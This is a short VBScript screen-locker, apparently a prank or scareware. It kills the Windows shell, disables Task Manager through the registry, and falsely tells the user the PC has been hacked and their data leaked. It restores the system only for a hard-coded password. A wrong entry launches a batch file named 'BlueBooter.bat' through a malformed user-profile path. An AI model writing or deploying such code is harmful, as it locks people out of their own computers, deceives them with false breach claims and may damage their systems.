Set cmd = CreateObject ("wscript.shell")
Dim Input
pass = "windows do you think this is funny?"

cmd.run "taskkill /f /im explorer.exe"
cmd.run "reg add HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f"
X=MsgBox("your pc has been now hacked and personal infomation has been leaked",0+16,"oopsies")

Input=InputBox("YOUR PC HAS BEEN NOW HACKED!!")
If Input = pass Then
X=MsgBox("Correct!",0+64,"password corect")
cmd.run "C:\Windows\explorer.exe"
cmd.run "reg add HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 0 /f"
Else
X=MsgBox("Incorrect so reinstall windows :)",+16,"nuh uh")
cmd.run "C:\Users\%USERPROFILE%\Desktop\idk\BlueBooter.bat"
End If
